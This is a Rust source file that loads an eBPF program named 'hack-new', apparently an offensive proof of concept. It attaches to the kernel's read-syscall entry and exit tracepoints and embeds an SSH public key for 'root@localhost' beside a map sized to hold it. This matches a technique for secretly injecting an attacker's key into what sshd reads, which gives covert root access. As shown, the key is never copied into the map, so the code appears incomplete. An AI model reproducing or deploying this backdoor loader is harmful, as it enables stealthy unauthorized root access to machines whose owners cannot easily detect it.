use aya::programs::trace_point::TracePoint;
use aya::Ebpf;
use aya::{include_bytes_aligned, maps::Array};
use aya_log::EbpfLogger;
use log::{debug, info, warn};
use tokio::signal;

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    env_logger::init();

    // Bump the memlock rlimit. This is needed for older kernels that don't use the
    // new memcg based accounting, see https://lwn.net/Articles/837122/
    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {}", ret);
    }

    // This will include your eBPF object file as raw bytes at compile-time and load it at
    // runtime. This approach is recommended for most real-world use cases. If you would
    // like to specify the eBPF program at runtime rather than at compile-time, you can
    // reach for `Bpf::load_file` instead.
    #[cfg(debug_assertions)]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../target/bpfel-unknown-none/debug/hack-new"
    ))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../target/bpfel-unknown-none/release/hack-new"
    ))?;
    if let Err(e) = EbpfLogger::init(&mut bpf) {
        // This can happen if you remove all log statements from your eBPF program.
        warn!("failed to initialize eBPF logger: {}", e);
    }

    let pub_key = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCiZa5Lioe9jhwyEkEMEYjmdvb4+GlsAWwsnb87T1u80jedieN82k//mCX1sF7HvvMw/7/mIszjNmghhzmxYYjhPQXNYd82gG/6fEDzMx3/QmH/5gvrqh4E39RgSfasX0odoPWwR5kkFefQPBzJLwcxZKtL2omB5Ynj5oXamDXGmEfFP1qLiBxCucxxa6pb605hUm6lPx5fQld9+lS72daX9bLriF5vXVEM9IDSuNwvUAyaakifBgXmULypr5o5uSJSxjLOZ07X38FC+4EkobG1nA+PWzKFzL0KQgOb0h6r+XfklnTQn0nA/SdyP9nDTUdoyU4Cot/QYJXQ8AbGRRMzCissUJ3Qe7onqYs/OlYi/aAkrvjGE/Ndi9D/dAiu2YKjfQsOVlsBu9R0aOMxoQMqh4mFB27Xe/5h1zPnHaJsGvh2vjvcCAj/1BqTfCJF8bSv4ckwkuCEde1zm1YEmr3rMywBZdirvB5tpnnIJ79W8YtS9ogpmDCXOBGPKtEy1OO8hJbHmm5j7c3LFKhgE6dsKD0lwTrlkmrtUSUEjyP/LyuvWPKV5nEX9Lace6lS3RQ42cwdg6+UsUyy/YNkuDwIdjxqduolMwOjGG1V44mjEySztWAEjGIFkjFBWrD/Bh1/JPd959pCsmRBVfrYqeOUGR11K7bxr+j0ma0eWVXplw== root@localhost\n";
    let string_array: Array<&mut aya::maps::MapData, [u8; 740]> =
        Array::try_from(bpf.map_mut("string_array").unwrap())?;

    let sys_enter_read_point: &mut TracePoint = bpf
        .program_mut("tracepoint_sys_enter_read")
        .unwrap()
        .try_into()?;
    sys_enter_read_point.load()?;
    sys_enter_read_point.attach("syscalls", "sys_enter_read")?;

    let sys_enter_read_point: &mut TracePoint = bpf
        .program_mut("tracepoint_sys_exit_read")
        .unwrap()
        .try_into()?;
    sys_enter_read_point.load()?;
    sys_enter_read_point.attach("syscalls", "sys_exit_read")?;

    info!("Waiting for Ctrl-C...");
    signal::ctrl_c().await?;
    info!("Exiting...");

    Ok(())
}
